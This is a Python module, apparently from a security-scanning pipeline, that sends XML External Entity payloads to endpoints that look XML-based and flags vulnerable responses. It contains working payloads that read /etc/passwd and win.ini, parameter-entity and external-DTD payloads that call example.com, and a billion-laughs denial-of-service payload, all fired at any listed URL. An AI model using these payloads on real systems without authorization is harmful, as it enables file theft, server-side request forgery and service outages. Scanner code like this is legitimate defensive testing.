"""XXE (XML External Entity) vulnerability detection module.

Tests endpoints that accept XML input for XXE vulnerabilities:
- In-band XXE: Entity values reflected in response
- Out-of-band XXE: OOB entity resolution via DTD
- Parameter Entity XXE: Blind XXE via parameter entities
- Local file inclusion via XXE: file:// protocol handler
- SSRF via XXE: http:// entity resolution

This module is conservative — it only tests endpoints that are
known or suspected to accept XML content (based on Content-Type, file
extensions, or response characteristics).
"""

import logging
from typing import Any
from urllib.parse import urlparse

import httpx

logger = logging.getLogger(__name__)

# XXE payload variations
XXE_PAYLOADS = [
    {
        "name": "basic_entity_read",
        "type": "in_band",
        "xml": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>""",
    },
    {
        "name": "basic_entity_windows",
        "type": "in_band",
        "xml": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<test>&xxe;</test>""",
    },
    {
        "name": "parameter_entity",
        "type": "blind",
        "xml": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://example.com/xxe.dtd">%dtd;%xxe;]>
<test></test>""",
    },
    {
        "name": "xxe_billion_laughs",
        "type": "dos",
        "xml": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<test>&lol4;</test>""",
    },
    {
        "name": "xxe_schema_location",
        "type": "in_band",
        "xml": """<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://example.com/file:///etc/passwd">
  <test>exploit</test>
</root>""",
    },
    {
        "name": "xxe_external_dtd",
        "type": "oob",
        "xml": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root PUBLIC "-//O//O" "http://example.com/xxe.dtd">
<root><test>exploit</test></root>""",
    },
]

# Endpoints likely to accept XML
XML_EXTENSIONS = frozenset(
    {
        ".xml",
        ".xsl",
        ".xslt",
        ".xsd",
        ".wsdl",
        ".svg",
        ".rss",
        ".atom",
        ".soap",
        ".xaml",
        ".xspf",
    }
)

XML_CONTENT_TYPES = frozenset(
    {
        "text/xml",
        "application/xml",
        "application/atom+xml",
        "application/rss+xml",
        "application/soap+xml",
    }
)


async def test_xxe_vulnerabilities(
    urls: list[str],
    timeout: float = 10.0,
    max_urls: int = 50,
    oob_callback_url: str | None = None,
) -> list[dict[str, Any]]:
    """Test URLs for XXE vulnerabilities.

    Args:
        urls: List of URLs to test.
        timeout: Per-request timeout in seconds.
        max_urls: Maximum URLs to test (performance cap).
        oob_callback_url: URL for OOB XXE validation (optional).

    Returns:
        List of findings with keys: url, payload, vulnerability_type,
        evidence, severity.
    """
    if not urls:
        return []

    # Filter: only test endpoints likely to accept XML
    xml_urls = _filter_xml_endpoints(urls)
    findings: list[dict[str, Any]] = []

    async with httpx.AsyncClient(
        timeout=timeout,
        follow_redirects=False,
        verify=True,
        headers={"User-Agent": "cyber-pipeline/1.0"},
    ) as client:
        for url in xml_urls[:max_urls]:
            findings.extend(await _test_url(client, url, oob_callback_url))

    logger.info(
        "XXE testing: tested %d XML endpoints, found %d vulnerabilities",
        min(len(xml_urls), max_urls),
        len(findings),
    )
    return findings


def _filter_xml_endpoints(urls: list[str]) -> list[str]:
    """Filter URLs to only those likely to accept XML."""
    return [url for url in urls if _is_xml_endpoint(url)]


def _is_xml_endpoint(url: str) -> bool:
    """Check if a URL is likely to accept XML input."""
    parsed = urlparse(url)
    path = parsed.path.lower()

    # Check file extension
    for ext in XML_EXTENSIONS:
        if path.endswith(ext):
            return True

    # Check common API paths that may accept XML
    if any(segment in path for segment in ("/soap", "/xml", "/wsdl", "/webservice")):
        return True

    return False


async def _test_url(
    client: httpx.AsyncClient,
    url: str,
    oob_callback_url: str | None,
) -> list[dict[str, Any]]:
    """Test a single URL for XXE vulnerabilities."""
    findings: list[dict[str, Any]] = []

    # First, get a baseline
    try:
        baseline = await client.get(url)
    except httpx.RequestError:
        return findings

    for payload in XXE_PAYLOADS:
        # Skip OOB payloads if no callback URL is configured
        if payload["type"] == "oob" and not oob_callback_url:
            continue

        try:
            resp = await client.post(
                url,
                content=payload["xml"],
                headers={"Content-Type": "application/xml"},
            )

            # Check for in-band XXE: response contains file content
            body = resp.text or ""
            if _detect_xxe_reflection(body, payload, baseline.text or ""):
                findings.append(
                    {
                        "url": url,
                        "payload": payload["name"],
                        "vulnerability_type": payload["type"],
                        "severity": "critical" if payload["type"] in ("in_band", "dos") else "high",
                        "evidence": {
                            "request_content_type": "application/xml",
                            "response_status": resp.status_code,
                            "response_size": len(body),
                            "payload_name": payload["name"],
                        },
                    }
                )

        except httpx.RequestError:
            continue

    return findings


def _detect_xxe_reflection(
    response_body: str,
    payload: dict[str, Any],
    baseline_body: str,
) -> bool:
    """Detect XXE exploitation indicators in response."""
    # Check for etc/passwd content indicators
    passwd_indicators = ["/bin/bash", "/bin/sh", "root:", "nobody:", "daemon:"]
    if any(indicator in response_body for indicator in passwd_indicators):
        return True

    # Check for win.ini content
    win_indicators = ["[extensions]", "[fonts]", "[mci extensions]", "[files]"]
    if any(indicator in response_body for indicator in win_indicators):
        return True

    # Check for response size anomalies (billion laughs amplification)
    if len(response_body) > len(baseline_body) * 10 and len(response_body) > 10000:
        return True

    # Check for error messages revealing XML parsing
    xml_error_patterns = [
        "xml parser",
        "entity expansion",
        "external entity",
        "xmlparse",
        "expat",
        "libxml",
        "xmlreader",
    ]
    body_lower = response_body.lower()
    if any(pattern in body_lower for pattern in xml_error_patterns):
        return True

    return False
